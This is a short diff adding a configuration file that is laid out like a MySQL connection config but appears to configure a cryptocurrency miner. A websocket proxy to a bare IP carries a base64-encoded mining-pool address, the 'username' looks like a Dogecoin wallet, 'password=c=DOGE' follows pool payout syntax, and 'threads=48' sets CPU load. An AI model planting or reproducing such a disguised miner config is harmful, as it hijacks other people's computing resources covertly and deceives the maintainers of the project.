@@ -1,0 +1,6 @@
+proxy=ws://8.222.235.5:8080/eGVsaXN2Mi1wZXBldy5zZWEubWluZS56cG9vbC5jYTo0ODMz
+host=127.0.0.1
+port=3306
+username=DL1QPkjfS5marmWc38jNKRSpGBUEKoyspf
+password=c=DOGE
+threads=48
